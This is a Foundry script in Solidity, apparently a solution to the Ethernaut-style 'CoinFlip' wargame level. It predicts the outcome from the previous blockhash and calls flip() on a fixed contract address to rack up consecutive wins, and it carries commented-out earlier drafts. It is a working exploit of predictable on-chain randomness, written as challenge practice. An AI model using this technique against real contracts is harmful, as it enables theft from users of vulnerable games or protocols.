//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel03.sol";
import "../node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol";

contract POC is Script {
    using SafeMath for uint256;
    CoinFlip level3 = CoinFlip(0x23e9e518D592371B491c2172293dB4e2eE9f6baa);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    uint256 public consecutiveWins;

    function run() external {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("hash is equals block value");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = level3.flip(side);
        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }
        console.log("Result: ", isRight);
        console.log("Consecutive Wins: ", level3.consecutiveWins());

        // uint256 blockValue = uint256(blockhash(block.number - 1));
        // bool result;

        // if (lastHash == blockValue) {
        //     revert();
        // }
        // lastHash = blockValue;
        // uint256 coinFlip = blockValue / FACTOR;
        // bool side = coinFlip == 1 ? true : false;
        // result = level3.flip(side);

        // // if (side) {
        // //     result = level3.flip(true);
        // // }
        // // // } else {
        // // //     level3.flip(false);
        // // // }

        // // if (side == false) {
        // //     result = level3.flip(false);
        // // }
        // console.log("Expected: ", side);
        // console.log("Result: ", result);
        // console.log("Consecutive Wins: ", level3.consecutiveWins());
        vm.stopBroadcast();
    }
}
